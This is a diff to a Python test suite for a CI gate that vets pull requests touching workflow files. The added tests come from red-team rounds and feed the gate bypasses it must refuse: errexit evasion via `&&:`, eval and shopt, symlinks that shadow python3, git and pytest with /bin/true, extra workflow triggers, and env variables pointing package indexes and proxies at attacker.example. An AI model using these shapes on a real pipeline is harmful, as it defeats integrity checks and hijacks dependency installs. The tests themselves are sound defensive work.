@@ -1662,7 +1662,8 @@ def test_contract_commands_run_and_policy_documents_keep_their_ids(repo):
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
     real = ("          out=$(python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\" 2>&1) && rc=0 || rc=$?\n"
             "          python3 -m py_compile \"$gate\"\n"
-            "          python3 -m pytest tests/scripts/test_spec_gate.py -q && \\\n            mode=$(git ls-tree \"$HEAD_SHA\" .githooks/pre-commit)\n"
+            "          python3 -m pytest tests/scripts/test_spec_gate.py -q\n"
+            "          mode=$(git ls-tree \"$HEAD_SHA\" .githooks/pre-commit)\n"
             "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
     assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", real)}, **cap).returncode == 0
     for path, blank in ((CATALOG, ""), (CATALOG, "# Feature Catalog\n"), (REQUIREMENTS, "# Requirements\n\nprose only\n")):
@@ -1737,14 +1738,21 @@ def test_contract_commands_run_unconditionally_under_the_declared_trigger(repo):
                   "          test -f y || {c}\n"):
         r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", "".join(shape.replace("{c}", c) for c in cmds))}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
-    # the first command of a chain runs unconditionally and its failure fails the step
+    # the left operand of `&&` is exempt from errexit just like that of `||` (red-team round two)
     guarded = "".join(f"          {c} && echo ok\n" for c in cmds)
-    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", guarded)}, **cap).returncode == 0
+    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", guarded)}, **cap)
+    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
     decoy = head.replace("name: registry-check\non:\n  pull_request:\n", "on:\n  workflow_dispatch:\n").replace("    runs-on:", "    pull_request:\n    runs-on:")
     r = pr(repo, "chore/gate-workflow", {wf: decoy.replace("{BODY}", plain)}, **cap)
     assert r.returncode == 1 and "no longer runs on pull_request" in r.stdout and "workflow_dispatch" in r.stdout, r.stdout
     inline = head.replace("name: registry-check\non:\n  pull_request:\n", "name: registry-check\non: [pull_request, workflow_dispatch]\n")
-    assert pr(repo, "chore/gate-workflow", {wf: inline.replace("{BODY}", plain)}, **cap).returncode == 0
+    r = pr(repo, "chore/gate-workflow", {wf: inline.replace("{BODY}", plain)}, **cap)
+    # red-team round two: a second event ran the same steps outside the pull-request context
+    assert r.returncode == 1 and "declares triggers other than pull_request (workflow_dispatch)" in r.stdout, r.stdout
+    for extra in ("  push:\n", "  workflow_dispatch:\n", "  schedule:\n    - cron: '0 0 * * *'\n"):
+        r = pr(repo, "chore/gate-workflow", {wf: head.replace("on:\n  pull_request:\n", "on:\n" + extra + "  pull_request:\n").replace("{BODY}", plain)}, **cap)
+        assert r.returncode == 1 and "declares triggers other than pull_request" in r.stdout, (extra, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: inline.replace("[pull_request, workflow_dispatch]", "[pull_request]").replace("{BODY}", plain)}, **cap).returncode == 0
     gate_wf = gate_workflow().replace("on:\n  pull_request_target:\n", "on:\n  {ON}:\n")
     r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request") + "# pull_request_target:\n"}, **cap)
     assert r.returncode == 1 and "no longer runs on pull_request_target" in r.stdout, r.stdout
@@ -2498,7 +2506,8 @@ def test_contract_jobs_keep_their_context_and_runner(repo):
         assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, (extra, r.stdout)
     r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  base-suite:\n    name: bs-x\n", 1)}, **cap)
     assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, r.stdout
-    for env_name in ("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "NODE_OPTIONS", "UV_INDEX_URL"):
+    for env_name in ("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "NODE_OPTIONS", "UV_INDEX_URL", "HTTPS_PROXY", "https_proxy",
+                     "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "RUNNER_TEMP", "GITHUB_ENV", "TMPDIR", "NODE_PATH"):
         r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n", f"env:\n  {env_name}: https://attacker.example/simple/\npermissions:\n", 1)}, **cap)
         assert r.returncode == 1 and "in an `env:` block" in r.stdout, (env_name, r.stdout)
     assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
@@ -2571,3 +2580,24 @@ def test_hook_grammar_supersedes_paths_catalog_shape_and_documentation_edges(rep
     dup = spec().replace("status: approved", "status: draft\nstatus: approved", 1)
     r = pr(repo, "docs/spec-dup", {"docs/superpowers/specs/2026-09-28-model-dup.md": dup})
     assert r.returncode == 1 and "more than once; one value per key" in r.stdout, r.stdout
+
+
+def test_and_lists_eval_shopt_and_path_shadows_do_not_hide_a_failure(repo):
+    """Red-team round two (spec_gate.py: shell_statements, the inline-code refusal, WRITES_GATE):
+    `verdict &&:` then `true` exited 0 on a failing gate because only `||` was swallowed;
+    `eval "set +e"` and `shopt -uo errexit` turned errexit off out of the model's sight; a
+    symlink named python3 ahead of /usr/bin on PATH replaced the interpreter. Each is refused.
+    """
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    wf = ".github/workflows/spec-gate.yml"
+    for shape, why in (("|\n          " + VERDICT_CMD + " &&:\n          true", "no longer executes"),
+                       ("|\n          eval \"set +e\"\n          " + VERDICT_CMD + "\n          true", "never eval, source or shopt"),
+                       ("|\n          shopt -uo errexit\n          " + VERDICT_CMD + "\n          true", "never eval, source or shopt"),
+                       ("|\n          source ./docs/x.sh\n          " + VERDICT_CMD, "never eval, source or shopt"),
+                       ("|\n          . ./docs/x.sh\n          " + VERDICT_CMD, "never eval, source or shopt"),
+                       ("|\n          ln -s /bin/true /usr/local/bin/python3\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
+                       ("|\n          printf '#!/bin/sh\\nexit 0' > /usr/local/bin/git\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
+                       ("|\n          cp /bin/true \"$HOME/.local/bin/pytest\"\n          " + VERDICT_CMD, "writes to or replaces a gate file")):
+        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        assert r.returncode == 1 and why in r.stdout, (shape, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow()}, **cap).returncode == 0
